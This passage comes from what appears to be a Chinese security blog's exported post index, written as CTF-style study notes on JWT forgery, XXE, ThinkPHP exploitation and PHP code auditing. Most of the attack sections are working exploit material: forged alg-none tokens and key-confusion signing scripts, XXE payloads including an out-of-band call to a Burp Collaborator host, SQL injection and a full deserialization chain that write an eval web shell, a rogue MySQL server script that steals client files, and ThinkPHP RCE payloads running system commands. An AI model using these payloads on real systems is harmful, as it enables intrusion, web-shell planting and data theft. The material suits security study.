是一个轻量级的认证规范,这个规范允许使用jwt在用户和服务器之间传递安全可靠的信息.其本质是一个token,是一种紧凑的url安全方法,用于在网络通信的双方之间传递.\n\n我们可以进jwt官网看一下jwt.io\n\njwt明文只能看不能改\njwt使用jwt的漏洞空加密算法jwt支持空加密算法，可以在header中指定alg为none，这样的花，只要把signature设置为空，即不添加signature字段提交到服务器，任何token都可以通过服务器验证\n但是我们会发现官网是没法生成空加密的，但是我们知道它的signature是base64，所以我们直接手工生成\n&#123;  &quot;alg&quot;: &quot;None&quot;,  &quot;typ&quot;: &quot;JWT&quot;&#125;&#123;  &quot;iss&quot;: &quot;admin&quot;,  &quot;iat&quot;: 1664193697,  &quot;exp&quot;: 1664200897,  &quot;nbf&quot;: 1664193697,  &quot;sub&quot;: &quot;admin&quot;,  &quot;jti&quot;: &quot;fa2fb0a80953bd65a5dfe2afec06048e&quot;&#125;在两段编码中间用.隔开\n\n\newogICJhbGciOiAiTm9uZSIsCiAgInR5cCI6ICJKV1QiCn0K.ewogICJpc3MiOiAiYWRtaW4iLAogICJpYXQiOiAxNjY0MTkzNjk3LAogICJleHAiOiAxNjY0MjAwODk3LAogICJuYmYiOiAxNjY0MTkzNjk3LAogICJzdWIiOiAiYWRtaW4iLAogICJqdGkiOiAiZmEyZmIwYTgwOTUzYmQ2NWE1ZGZlMmFmZWMwNjA0OGUiCn0=.\n\n(header+”.”+payload+”.”, 去掉了’.’signature字段)\n空加密算法是为了调试方便，在生产环境中开启空加密模式，缺少签名保护，攻击者只要把alg字段改成none，就可以在payload中构造身份，伪造用户身份。\n密钥爆破我们可以使用c-jwt-cracker-master进行jwt密钥爆破\n私钥泄露攻击这里访问/private.key就能任意文件下载私钥，但是我们尝试在官网是无法生成的，但是我们可以自己写脚本生成\n这里就需要在本地安装node，然后npm install jsonwebtoken\nconst jwt = require(&quot;jsonwebtoken&quot;);var fs = require(&quot;fs&quot;);var privateKey = fs.readFileSync(&quot;private.key&quot;);var token =jwt.sign(&#123;user:&#x27;admin&#x27; &#125;,privateKey,&#123;algorithm:&#x27;RS256&#x27;&#125;);console.log(token);\n\n然后写这么个脚本,生成\n公钥泄露攻击jwt中最常用的两种算法为HMAC和RSA\nHMAC是一种对称加密算法，使用相同的密钥进行加解密\nRSA是一种非对称加密算法，使用私钥加密，公钥解密\n在HMAC和RSA中，都使用私钥对signature字段进行签名，只有拿到了加密时使用的私钥，才有可能伪造token\n密钥一般情况下是无法获取的，但是可以获取到公钥，我们可以将加密算法RSA改成HAMC，即将alg字段由RS256改成HS256，同时使用获取到的公钥作为算法的密钥，对token进行签名提交给服务端.服务器会将RSA的公钥作为当前算法(HMAC)的密钥，HMAC公钥和密钥相同，使用HS256算法会对接收到的签名进行验证。\nconst jwt = require(&quot;jsonwebtoken&quot;);var fs = require(&quot;fs&quot;);var privateKey = fs.readFileSync(&quot;public.key&quot;);var token =jwt.sign(&#123;user:&#x27;admin&#x27; &#125;,privateKey,&#123;algorithm:&#x27;HS256&#x27;&#125;);console.log(token);\n\n但是这里要注意，我们在进行密钥攻击时，一定要用post方式\n第三节　XXE文件读取0x5什么是xxe漏洞xxe的概念xxe是外部XML Entity实体注入,危害性较小\nxml定义了两种实体类型，分别是\n\n普通entity 在xml文档中使用\n参数entity 在dtd文档中使用\n\nXML类似与HTML，是比较简单的标记语言\n在我看来，XML与HTML的不同点可能就在与XML会有一个这种头\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;\n然后就是XML有个DTD，DTD是一个非常重要的点，DTD可以引用一些外部的文件，也可以用SYSTEM的方式读取一些其他的DTD文件，就与文件包含一样。\n内部声明DTD：\n&lt;!DOCTYPE 根元素 [元素声明]&gt;\n引用外部DTD\n&lt;!DOCTYPE 根元素 [SYSTEM　＂文件名/url＂]&gt;\n这边来一段XML例子\n&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE note [      &lt;!ELEMENT note (to,from,heading,body)&gt;      &lt;!ELEMENT to (#PCDATA)&gt;      &lt;!ELEMENT from (#PCDATA)&gt;      &lt;!ELEMENT heading (#PCDATA)&gt;      &lt;!ELEMENT body (#PCDATA)&gt;      &lt;!ENTITY jt &quot;test&quot;&gt;      ]&gt;&lt;note&gt;  &lt;to&gt;Tove&lt;/to&gt;  &lt;from&gt;Jani&lt;/from&gt;  &lt;heading&gt;Reminder&lt;/heading&gt;  &lt;body&gt; Dont forget me this night！&lt;/body&gt;  &lt;test&gt;&amp;jt;&lt;/test&gt;&lt;/note&gt;\n\nELEMENT代表元素；ENTITY代表实例\nxml非常灵活，定义后也可以不用，没有定义也可以用。\nPCDATA　可以解析\n例如：\n&amp;lt;   &lt;&amp;gt;   &gt;&amp;amp;  &amp;&amp;quot; &quot;&amp;apos; &#x27;\n\nCDATA 不可解析\n来一个引用外部DTD的🌰\n我们将上边的代码拆开\n&lt;!DOCTYPE note [      &lt;!ELEMENT note (to,from,heading,body)&gt;      &lt;!ELEMENT to (#PCDATA)&gt;      &lt;!ELEMENT from (#PCDATA)&gt;      &lt;!ELEMENT heading (#PCDATA)&gt;      &lt;!ELEMENT body (#PCDATA)&gt;      &lt;!ENTITY jt &quot;test&quot;&gt;      ]&gt;\n\n这一部分我们命名为simple.dtd\n然后在另外一半中加入一串新的DOCTYPE\n&lt;?xml version=&quot;1.0&quot;?&gt;&lt;!DOCTYPE note [SYSTEM &quot;simple.dtd&quot;]&gt;&lt;note&gt;  &lt;to&gt;Tove&lt;/to&gt;  &lt;from&gt;Jani&lt;/from&gt;  &lt;heading&gt;Reminder&lt;/heading&gt;  &lt;body&gt; Dont forget me this night！&lt;/body&gt;  &lt;test&gt;&amp;jt;&lt;/test&gt;&lt;/note&gt;\n\n% xxx 是定义DTD变量，这种变量只能在dtd中使用，无法引用到xml\n&lt;!ENTITY % 123 &quot;123&quot;&gt;%123;\n\nxxe危害xxe利用，主流是读取文件为主，可以作为任意文件读取切入点\nxxe利用php中xxe的一般写法如下：\nlibxml_disable_entity_loader #禁用/启用加载外部实体的功能，参数为true时启用，参数为false时禁用file_get_contents(&#x27;php://input&#x27;) #接收POST请求方式传的数据loadXML($xmlfile,LIBXML_NOENT | LIBXML_DTDLOAD) #通过解析一个xml标签字符串来组成该文档simplexml_import_dom #把DOM节点转换为SimpleXMLElement对象$creds-&gt;ctfshow #获取页面中的ctfshow元素\n\n有回显的情况这种情况我们可以直接用file协议读取文件\n例如\n&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE xxe [&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt;]&gt;&lt;root&gt;&lt;ctfshow&gt;&amp;xxe;&lt;/ctfshow&gt;&lt;/root&gt;\n\n无回显情况我们可以使用外部的DTD，通过一个公网ip进行读取\n这里我们举两个例子分别是xml-dtd的OOB和只有dtd的OOB\n我们抓包看一下，能发现xml\n\n这里我们发现里边并没有DTD，但是我们可以构造一段DTD\n&lt;!DOCTYPE stockCheck [ &lt;!ENTITY xxe SYSTEM &quot;http://f1hsyj0mt36nat549jqspboge7ky8n.burpcollaborator.net&quot;&gt; ] &gt;\n这里我们选用的是burp suite自带的类似于dnslog的东西\n\n有时候我们也会遇到这种情况\n\n\n什么叫实体呢？&amp;xxe就是实体，那我们不用实体了，不引用到xml中了，直接用%定义DTD变量，但是这里要注意%定义的时候要有空格\n% xxe\n\nXXE 后端代码xxe.php&lt;?php// file:///$dom = new DOMDocument();$dom -&gt; validateOnParse = true;//第一种方法通过属性验证强制加载外部DTD(是否通过DTD强制加载)@$dom-&gt;load(&#x27;simple.xml&#x27;);//@表示会强制加载外部DTD文件if(@$dom-&gt;validate())&#123; //（第二种方法通过方法验证）这个@表示屏蔽验证不通过时的信息    echo &quot;yes&quot;;&#125;else&#123;    echo &quot;no&quot;;&#125;$x = $dom-&gt;documentElement;foreach ($x-&gt;childNodes AS $item)&#123;    print $item-&gt;nodeName .&quot;=&quot;.$item-&gt;nodeValue.&quot;&lt;br&gt;&quot;;&#125;\n\nsimple.xml&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot; ?&gt;&lt;!DOCTYPE note SYSTEM &#x27;simple.dtd&#x27;&gt;&lt;note&gt;    &lt;to&gt;TO&lt;/to&gt;    &lt;from&gt;FROM&lt;/from&gt;    &lt;heading&gt;HEADING&lt;/heading&gt;    &lt;body&gt;        %company;        &amp;aa;    &lt;/body&gt;&lt;/note&gt;\n\nsimple.dtd&lt;!ELEMENT note (to,from,heading,body)&gt;&lt;!ELEMENT to (#PCDATA)&gt;&lt;!ELEMENT from (#PCDATA)&gt;&lt;!ELEMENT heading (#PCDATA)&gt;&lt;!ELEMENT body (#PCDATA)&gt;&lt;!ENTITY % company &#x27;charmersix&#x27;&gt;&lt;!ENTITY aa &quot;2020~2022 %compy; 版权所有&quot;&gt;\n\n效果：\n","tags":["Web","Study","SSRF","JWT","XXE"]},{"title":"Web_8_thinkphp专题","url":"/2023/02/19/web_8_tp/","content":"第一节 认识thinkphp0x1 php开发框架为了避免重复造轮子, 这里就出现了PHP开发框架, 只需要装修一下就可以使用\n其背后思想为mvc思想\n常见的开发框架thinkphp开源的PHP框架，为了简化企业级应用开发和敏捷web应用开发而诞生的。遵循apache2开源协议发布。\nYii简洁优秀的开源PHP框架\nLaravel帮你构建一个完美的网络app，每行代码都可以简洁、富于表达力。\nMVC基础指MVC模式的某种框架，强制性地使应用程序的输入、处理和输出分开。使用MVC应用程序被分成三个核心模型：模型、视图、控制器\nview(视图)视图是用户看到的并与之交互的界面, 对老式的web应用程序来说, 视图就是由HTML元素组成的界面\n显示数据由视图负责\nmodel(模型)表示业务规则, 在MVC三个部件中, 模型拥有最多的处理任务. 被模型返回的数据是中立的, 模型与数据格式无关, 这样一个模型能为多个视图提供数据, 由于应用于模型的代码只需写一次就可以被多个视图使用, 所以减少了代码的重复性\n数据读取与存储是由模型负责的\ncontroller(控制器)是指接收用户输入并调用模型和视图去完成用户的需求, 控制器本身不输出任何东西和做任何处理, 它只是接收请求并决定调用哪个模型构件去处理请求, 然后再确定用哪个视图来显示返回的数据\n自己写一个PHP框架首先确定一下框架的主要功能\n\n基于pathinfo下的路由监听\n业务分层, 实现简单的mvc\n渲染引擎\n控制器\n数据处理\n\n首先写一个index.php\n&lt;?phpecho &quot;i am admin controller&lt;br&gt;&quot;;class admin&#123;    function login($username,$password)&#123;        if($username==&#x27;admin&#x27;&amp;&amp;$password==&#x27;admin&#x27;)&#123;            echo &quot;登陆成功&quot;;        &#125;else&#123;            echo &quot;登录失败&quot;;        &#125;    &#125;    function logout()&#123;        echo &quot;i am logout function&quot;;    &#125;    static function getInstance()&#123;        return new admin();    &#125;\n\n然后新建一个controller目录\n//admin.php&lt;?phpecho &quot;i am admin controller&lt;br&gt;&quot;;class admin&#123;    function login($username,$password)&#123;        if($username==&#x27;admin&#x27;&amp;&amp;$password==&#x27;admin&#x27;)&#123;            echo &quot;登陆成功&quot;;        &#125;else&#123;            echo &quot;登录失败&quot;;        &#125;    &#125;    function logout()&#123;        echo &quot;i am logout function&quot;;    &#125;    static function getInstance()&#123;        return new admin();    &#125;&#125;\n\n//user.php&lt;?phpecho &quot;i am user controller&quot;;\n\n最终效果:\n\n第二节 thinkphp漏洞0x1 thinkphp框架下的信息收集 这里我们下载一个thinkphp的3.2.3版本的源码\n寻找tp框架的特征url中寻找特征thinkphp框架下的url一般是index.php/home/index/index类型, 个别会省略掉index.php, 直接是/home/index/index,这时候我们看到的是三层pathinfo结构, 就要考虑是thinkphp框架\n这时候我们可以修改模块或者控制器的名字, 检查报错信息, 访问http://localhost/index.php/home/charmersix/index\n可以看到报错信息的话就可以精确找到thinkphp的版本号了\n报错关闭的情况通过对thinkphp ui的敏感就可以一眼顶针, 看出其框架\n使用软路由检测这里我们可以通过get方式提交pathinfo的值, 这里依旧可以通过修改控制器/方法名来看报错信息\ntp的代码执行show参数可控下的代码执行假设我们有这样的代码\n&lt;?phpnamespace Home\\Controller;use Think\\Controller;class IndexController extends Controller&#123;    public function index($n=&#x27;&#x27;)&#123;        $this-&gt;show(&#x27;$n&#x27;);    &#125;&#125;\n\n可以直接渲染我们提交的n参数\n这里我们直接写php代码利用就可以\n利用日志文件代码执行在thinkphp开启debug的情况下会在runtime目录下生成log文件, 文件的名称是以年_月_日.log来命名的, 所以我们可以爆破文件名\nurl/Application/Runtime/Logs/Home/y_m_d.log\n这时候我们就可以抓包通过bp去爆破隐藏信息\n我们就可以得到这样一条接口\n执行代码获得flag即可\ntp的SQL注入漏洞在一切开始之前, 我们先看一下我们当前版本thinkphp的官方文档, 在这里\n基于where的SQL注入漏洞thinkphpSQL注入利用姿势: where数组绕过?id[where]=id=1&#39;\n例如:?id[where]=id=1 union select 1, (select group_concat(table_name) from information_schema.tables where table_schema=database()), 3, 4 limit 1, 1%23\n注释引起的SQL注入漏洞代码如下:\n&lt;?phpnamespace Home\\Controller;use Think\\Controller;class IndexController extends Controller&#123;    public function index($id=1)&#123;        $user = M(&#x27;users&#x27;)-&gt;comment($id)-&gt;find(intval($id));        $this-&gt;show(&#x27;&lt;p&gt;hello &#x27;.$user[&#x27;username&#x27;].&#x27;&lt;/p&gt;&#x27;,&#x27;utf-8&#x27;);    &#125;&#125;\n\n在这个框架中, comment将会被/**/包裹注释掉, 但是, 我们可以输入*/将注释闭合从而达到SQL注入, 但是这里我们会发现union联合注入是不能用的, 因为在limit后, union是不好用的\n这里我们就需要用到一个新姿势: 通过数据库写一句话文件, 然后达到我们想要的效果, 但是前提是数据库必须打开了secure-file-priv的写入文件权限\n然后我们直接写入一句话木马\n例如: ?id=1 */ into outfile &quot;/var/www/html/1.php&quot; lines terminated by &quot;&lt;?php eval($_POST[1])?&gt;&quot;;%23\n\n木马已经写进去, 直接利用即可\n\n第三节 thinkphp反序列化thinkphp挖链子基本流程\n1.寻找可利用的魔术方法, 比较常见的有__destruct/__wakeup2.继续寻找跳板3.最终通过其他函数/其他类的属性构造一个函数名可控函数参数可控的链子4.实现rce\n\ntp3.2版本tp3.2.3版本下的反序列化漏洞通过反序列化一个数据库的连接开启一个堆叠, 执行SQL语句, 写入一句话木马\n这里我们只需要用这个exp就可以生成一串cookie\n&lt;?phpnamespace Think\\Image\\Driver&#123;    use Think\\Session\\Driver\\Memcache;    class Imagick&#123;        private $img;        public function __construct()&#123;            $this-&gt;img=new Memcache();        &#125;    &#125;&#125;namespace Think\\Session\\Driver&#123;    use Think\\Model;    class Memcache &#123;        protected $handle;        public function __construct()&#123;            $this-&gt;handle=new Model();        &#125;&#125;&#125;namespace Think&#123;    use Think\\Db\\Driver\\Mysql;    class Model &#123;        protected $data = array();        protected $db = null;        protected $pk;        public function __construct()&#123;            $this-&gt;db=new Mysql();            $this-&gt;pk=&#x27;id&#x27;;            $this-&gt;data[$this-&gt;pk] = array(                &quot;table&quot; =&gt; &#x27;mysql.user;select &quot;&lt;?php eval($_POST[1]);?&gt;&quot; into outfile &quot;/var/www/html/1.php&quot;# &#x27;,                &quot;where&quot; =&gt; &quot;1&quot;            );        &#125;    &#125;&#125;namespace Think\\Db\\Driver&#123;    use PDO;    class Mysql&#123;        protected $options = array(            PDO::MYSQL_ATTR_LOCAL_INFILE =&gt; true,    // 开启才能读取文件            PDO::MYSQL_ATTR_MULTI_STATEMENTS =&gt; true //开启堆叠,发现不加这句话也可以        );        protected $config     = array(        &quot;debug&quot;             =&gt;   1,        &#x27;hostname&#x27;          =&gt;  &#x27;127.0.0.1&#x27;, // 服务器地址        &#x27;database&#x27;          =&gt;  &#x27;ctfshow&#x27;,          // 数据库名        &#x27;username&#x27;          =&gt;  &#x27;root&#x27;,      // 用户名        &#x27;password&#x27;          =&gt;  &#x27;root&#x27;,          // 密码        &#x27;hostport&#x27;          =&gt;  &#x27;3306&#x27;        );                  &#125;&#125;namespace&#123;    use Think\\Image\\Driver\\Imagick;    echo base64_encode(serialize(new Imagick()));&#125;\n\n我们运行一下这个脚本就可以生成一串base64编码, 然后我们改一下cookie发送即可\n然后就可以写入一个1.php的一句话木马\n\n如果这个方法不行, 可以使用远程读文件的姿势\n伪造MySQL服务端读取文件伪造一个MySQL的服务端, 让别人连接的情况下, 可以让别人把本地文件远程发给服务端, 这里虽然是读的服务器文件, 但是其实就相当于我们读的自己客户端的文件, 就相当于一个变相的钓鱼\n这里我们还是继续用上边的php脚本+python脚本, 但是上边php脚本的服务器地址需要改成我们自己的云服务器地址, 端口也需要改成3389\n然后我们在云服务器上开始运行这个python脚本, 开始监听\nfrom socket import AF_INET, SOCK_STREAM, errorfrom asyncore import dispatcher, loop as _asyLoopfrom asynchat import async_chatfrom struct import Structfrom sys import version_infofrom logging import getLogger, INFO, StreamHandler, Formatter_rouge_mysql_sever_read_file_result = &#123;&#125;_rouge_mysql_server_read_file_end = Falsedef checkVersionPy3():    return not version_info &lt; (3, 0)def rouge_mysql_sever_read_file(fileName, port, showInfo):    if showInfo:        log = getLogger(__name__)        log.setLevel(INFO)        tmp_format = StreamHandler()        tmp_format.setFormatter(Formatter(&quot;%(asctime)s : %(levelname)s : %(message)s&quot;))        log.addHandler(            tmp_format        )    def _infoShow(*args):        if showInfo:            log.info(*args)    # ================================================    # =======No need to change after this lines=======    # ================================================    __author__ = &#x27;Gifts&#x27;    __modify__ = &#x27;Morouu&#x27;    global _rouge_mysql_sever_read_file_result    class _LastPacket(Exception):        pass    class _OutOfOrder(Exception):        pass    class _MysqlPacket(object):        packet_header = Struct(&#x27;&lt;Hbb&#x27;)        packet_header_long = Struct(&#x27;&lt;Hbbb&#x27;)        def __init__(self, packet_type, payload):            if isinstance(packet_type, _MysqlPacket):                self.packet_num = packet_type.packet_num + 1            else:                self.packet_num = packet_type            self.payload = payload        def __str__(self):            payload_len = len(self.payload)            if payload_len &lt; 65536:                header = _MysqlPacket.packet_header.pack(payload_len, 0, self.packet_num)            else:                header = _MysqlPacket.packet_header.pack(payload_len &amp; 0xFFFF, payload_len &gt;&gt; 16, 0, self.packet_num)            result = &quot;&quot;.join(                (                    header.decode(&quot;latin1&quot;) if checkVersionPy3() else header,                    self.payload                )            )            return result        def __repr__(self):            return repr(str(self))        @staticmethod        def parse(raw_data):            packet_num = raw_data[0] if checkVersionPy3() else ord(raw_data[0])            payload = raw_data[1:]            return _MysqlPacket(packet_num, payload.decode(&quot;latin1&quot;) if checkVersionPy3() else payload)    class _HttpRequestHandler(async_chat):        def __init__(self, addr):            async_chat.__init__(self, sock=addr[0])            self.addr = addr[1]            self.ibuffer = []            self.set_terminator(3)            self.stateList = [b&quot;LEN&quot;, b&quot;Auth&quot;, b&quot;Data&quot;, b&quot;MoreLength&quot;, b&quot;File&quot;] if checkVersionPy3() else [&quot;LEN&quot;,                                                                                                           &quot;Auth&quot;,                                                                                                           &quot;Data&quot;,                                                                                                           &quot;MoreLength&quot;,                                                                                                           &quot;File&quot;]            self.state = self.stateList[0]            self.sub_state = self.stateList[1]            self.logined = False            self.file = &quot;&quot;            self.push(                _MysqlPacket(                    0,                    &quot;&quot;.join((                        &#x27;\\x0a&#x27;,  # Protocol                        &#x27;5.6.28-0ubuntu0.14.04.1&#x27; + &#x27;\\0&#x27;,                        &#x27;\\x2d\\x00\\x00\\x00\\x40\\x3f\\x59\\x26\\x4b\\x2b\\x34\\x60\\x00\\xff\\xf7\\x08\\x02\\x00\\x7f\\x80\\x15\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x68\\x69\\x59\\x5f\\x52\\x5f\\x63\\x55\\x60\\x64\\x53\\x52\\x00\\x6d\\x79\\x73\\x71\\x6c\\x5f\\x6e\\x61\\x74\\x69\\x76\\x65\\x5f\\x70\\x61\\x73\\x73\\x77\\x6f\\x72\\x64\\x00&#x27;,                    )))            )            self.order = 1            self.states = [b&#x27;LOGIN&#x27;, b&#x27;CAPS&#x27;, b&#x27;ANY&#x27;] if checkVersionPy3() else [&#x27;LOGIN&#x27;, &#x27;CAPS&#x27;, &#x27;ANY&#x27;]        def push(self, data):            _infoShow(&#x27;Pushed: %r&#x27;, data)            data = str(data)            async_chat.push(self, data.encode(&quot;latin1&quot;) if checkVersionPy3() else data)        def collect_incoming_data(self, data):            _infoShow(&#x27;Data recved: %r&#x27;, data)            self.ibuffer.append(data)        def found_terminator(self):            data = b&quot;&quot;.join(self.ibuffer) if checkVersionPy3() else &quot;&quot;.join(self.ibuffer)            self.ibuffer = []            if self.state == self.stateList[0]:  # LEN                len_bytes = data[0] + 256 * data[1] + 65536 * data[2] + 1 if checkVersionPy3() else ord(                    data[0]) + 256 * ord(data[1]) + 65536 * ord(data[2]) + 1                if len_bytes &lt; 65536:                    self.set_terminator(len_bytes)                    self.state = self.stateList[2]  # Data                else:                    self.state = self.stateList[3]  # MoreLength            elif self.state == self.stateList[3]:  # MoreLength                if (checkVersionPy3() and data[0] != b&#x27;\\0&#x27;) or data[0] != &#x27;\\0&#x27;:                    self.push(None)                    self.close_when_done()                else:                    self.state = self.stateList[2]  # Data            elif self.state == self.stateList[2]:  # Data                packet = _MysqlPacket.parse(data)                try:                    if self.order != packet.packet_num:                        raise _OutOfOrder()                    else:                        # Fix ?                        self.order = packet.packet_num + 2                    if packet.packet_num == 0:                        if packet.payload[0] == &#x27;\\x03&#x27;:                            _infoShow(&#x27;Query&#x27;)                            self.set_terminator(3)                            self.state = self.stateList[0]  # LEN                            self.sub_state = self.stateList[4]  # File                            self.file = fileName.pop(0)                            # end                            if len(fileName) == 1:                                global _rouge_mysql_server_read_file_end                                _rouge_mysql_server_read_file_end = True                            self.push(_MysqlPacket(                                packet,                                &#x27;\\xFB&#123;0&#125;&#x27;.format(self.file)                            ))                        elif packet.payload[0] == &#x27;\\x1b&#x27;:                            _infoShow(&#x27;SelectDB&#x27;)                            self.push(_MysqlPacket(                                packet,                                &#x27;\\xfe\\x00\\x00\\x02\\x00&#x27;                            ))                            raise _LastPacket()                        elif packet.payload[0] in &#x27;\\x02&#x27;:                            self.push(_MysqlPacket(                                packet, &#x27;\\0\\0\\0\\x02\\0\\0\\0&#x27;                            ))                            raise _LastPacket()                        elif packet.payload == &#x27;\\x00\\x01&#x27;:                            self.push(None)                            self.close_when_done()                        else:                            raise ValueError()                    else:                        if self.sub_state == self.stateList[4]:  # File                            _infoShow(&#x27;-- result&#x27;)                            # fileContent                            _infoShow(&#x27;Result: %r&#x27;, data)                            if len(data) == 1:                                self.push(                                    _MysqlPacket(packet, &#x27;\\0\\0\\0\\x02\\0\\0\\0&#x27;)                                )                                raise _LastPacket()                            else:                                self.set_terminator(3)                                self.state = self.stateList[0]  # LEN                                self.order = packet.packet_num + 1                            global _rouge_mysql_sever_read_file_result                            _rouge_mysql_sever_read_file_result.update(                                &#123;self.file: data.encode() if not checkVersionPy3() else data&#125;                            )                            # test                            # print(self.file + &quot;:\\n&quot; + content.decode() if checkVersionPy3() else content)                            self.close_when_done()                        elif self.sub_state == self.stateList[1]:  # Auth                            self.push(_MysqlPacket(                                packet, &#x27;\\0\\0\\0\\x02\\0\\0\\0&#x27;                            ))                            raise _LastPacket()                        else:                            _infoShow(&#x27;-- else&#x27;)                            raise ValueError(&#x27;Unknown packet&#x27;)                except _LastPacket:                    _infoShow(&#x27;Last packet&#x27;)                    self.state = self.stateList[0]  # LEN                    self.sub_state = None                    self.order = 0                    self.set_terminator(3)                except _OutOfOrder:                    _infoShow(&#x27;Out of order&#x27;)                    self.push(None)                    self.close_when_done()            else:                _infoShow(&#x27;Unknown state&#x27;)                self.push(&#x27;None&#x27;)                self.close_when_done()    class _MysqlListener(dispatcher):        def __init__(self, sock=None):            dispatcher.__init__(self, sock)            if not sock:                self.create_socket(AF_INET, SOCK_STREAM)                self.set_reuse_addr()                try:                    self.bind((&#x27;&#x27;, port))                except error:                    exit()                self.listen(1)        def handle_accept(self):            pair = self.accept()            if pair is not None:                _infoShow(&#x27;Conn from: %r&#x27;, pair[1])                _HttpRequestHandler(pair)                if _rouge_mysql_server_read_file_end:                    self.close()    _MysqlListener()    _asyLoop()    return _rouge_mysql_sever_read_file_resultif __name__ == &#x27;__main__&#x27;:    for name, content in rouge_mysql_sever_read_file(fileName=[&quot;/flag_is_here&quot;, &quot;/etc/hosts&quot;], port=3389,showInfo=True).items():        print(name + &quot;:\\n&quot; + content.decode())\n\ntp5.0版本未开启强制路由导致的rce最高版本支持到5.0.23\n常见payload:\n?s=index/think\\Request/input&amp;filter=system&amp;data=dir?s=index/think\\Request/input&amp;filter[]=system&amp;data=pwd?s=index/think\\view\\driver\\Php/display&amp;content=&lt;?php phpinfo();?&gt;?s=index/think\\template\\driver\\file/write&amp;cacheFile=shell.php&amp;content&lt;?php phpinfo();?&gt;?s=index/think\\Container/invokefunction&amp;function=call_user_func&amp;vars[]=system&amp;vars[]=dir?s=index/think\\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami?s=index/think\\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=whoami\n\n\n变量覆盖导致的rce参考例子:\npublic function index($name=&#x27;&#x27;,$from=&#x27;ctfshow&#x27;)&#123;    $this-&gt;assign($name,$from);//标记一个变量    $this-&gt;display(&#x27;index&#x27;);//显示index模板&#125;\n\n在手册中, 我们可以看到这样的使用方式\n\npayload:\n?name=_content&amp;from=&lt;?php system(&quot;cat /f*&quot;)?&gt;\n\n直接载入php模板执行代码\ntp5.1版本tp5.1反序列化rce推荐文章\n","tags":["Web","Study","unserialize","thinkphp","SQL"]},{"title":"Web_9_PHP代码审计","url":"/2023/03/24/web_9_PHP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/","content":"首先总结一下代码审计的思路\n\n\n检查敏感函数的参数, 然后回溯变量, 判断变量是否可控, 并且有没有经过严格的过滤, 这是一个逆向追踪的过程\n找出哪些文件在接收外部传入的参数, 然后跟踪变量的传递过程, 观察是否有变量传入到高危函数里面, 或者传递的过程是否有逻辑漏洞, 这是一种正向追踪的方式\n直接挖掘功能点漏洞, 根据自身经验判断该类应用通常在哪些功能中会出现漏洞, 直接全篇阅读该功能代码\n通篇阅读全文代码\n\n\n了解系统架构对于系统架构, 我们在确认了审计目标之后, 在审计之前, 需要先了解目标系统的基本架构, 比如目录情况/是否使用了框架/存在哪些路由/有没有安全过滤函数/有没有全局参数过滤; 这里就要分为有框架和无框架来进行分析\n使用了开发框架think PHP以tp5为例, 框架的大体目录结构如下:\nwww  WEB部署目录（或者子目录）├─application           应用目录│  ├─common             公共模块目录（可以更改）│  ├─module_name        模块目录│  │  ├─config.php      模块配置文件│  │  ├─common.php      模块函数文件│  │  ├─controller      控制器目录│  │  ├─model           模型目录│  │  ├─view            视图目录│  │  └─ ...            更多类库目录│  ││  ├─command.php        命令行工具配置文件│  ├─common.php         公共函数文件│  ├─config.php         公共配置文件│  ├─route.php          路由配置文件│  ├─tags.php           应用行为扩展定义文件│  └─database.php       数据库配置文件│├─public                WEB目录（对外访问目录）│  ├─index.php          入口文件│  ├─router.php         快速测试文件│  └─.htaccess          用于apache的重写│├─thinkphp              框架系统目录│  ├─lang               语言文件目录│  ├─library            框架类库目录│  │  ├─think           Think类库包目录│  │  └─traits          系统Trait目录│  ││  ├─tpl                系统模板目录│  ├─base.php           基础定义文件│  ├─console.php        控制台入口文件│  ├─convention.php     框架惯例配置文件│  ├─helper.php         助手函数文件│  ├─phpunit.xml        phpunit配置文件│  └─start.php          框架入口文件│├─extend                扩展类库目录├─runtime               应用的运行时目录（可写，可定制）├─vendor                第三方类库目录（Composer依赖库）├─build.php             自动生成定义文件（参考）├─composer.json         composer 定义文件├─LICENSE.txt           授权说明文件├─README.md             README 文件├─think                 命令行入口文件\n\n其中, application目录和public目录是应用程序文件目录和运行数据存放目录, 属于重点关注对象\n同时, application目录下的config.php/databse.php/route.php分别是系统配置文件/数据库操作文件/系统路由文件; 都要仔细分析\n对于ThinkPHP框架开发的应用，其访问系统的URL通常是这样的：/index.php/模块名/控制器名/函数名/[参数名/参数值]\n其中模块名对应了application目录下的文件夹的名字。控制器名对应了模块名目录下的controller文件夹下的php文件名。参数则是可选的，可以按照/参数名/参数值的方式同时传入多个参数，也可以按照传统方式使用?参数1=参数值1&amp;参数2=参数值2的方式传入变量。\nlaravel基本目录结构:\n|——app  包含了站点的controllers（控制器），models（模型），views（视图）和assets（资源|——bootstrap 存放系统启动时的必要文件，这些文件会被index.php这样的文件调用。|——public 系统运行的公开数据，包括静态资CSS文件、js文件等|——vender 第三方类库\n\n主要应用程序放在了app目录下\n没有使用开发框架在没有使用开发框架的情况下, 我们需要判断应用程序是否采用了mvc模式, 如果有的话, 需要查看系统的路由文件, 看看控制程序是如何通过路由定位的. 比如PHPCMS, 就是利用了自己开发出来的mvc控制器进行路由\n访问index.php, 可以看到包含了phpcms/base.php\ndefine(&#x27;PHPCMS_PATH&#x27;, dirname(__FILE__).DIRECTORY_SEPARATOR);include PHPCMS_PATH.&#x27;/phpcms/base.php&#x27;;\n\n进入base.php文件, 就能看到, 这里定义了特别多的路由以及初始化的一些类以及方法\n//PHPCMS框架路径define(&#x27;PC_PATH&#x27;, dirname(__FILE__).DIRECTORY_SEPARATOR);if(!defined(&#x27;PHPCMS_PATH&#x27;)) define(&#x27;PHPCMS_PATH&#x27;, PC_PATH.&#x27;..&#x27;.DIRECTORY_SEPARATOR);//缓存文件夹地址define(&#x27;CACHE_PATH&#x27;, PHPCMS_PATH.&#x27;caches&#x27;.DIRECTORY_SEPARATOR);//主机协议define(&#x27;SITE_PROTOCOL&#x27;, isset($_SERVER[&#x27;SERVER_PORT&#x27;]) &amp;&amp; $_SERVER[&#x27;SERVER_PORT&#x27;] == &#x27;443&#x27; ? 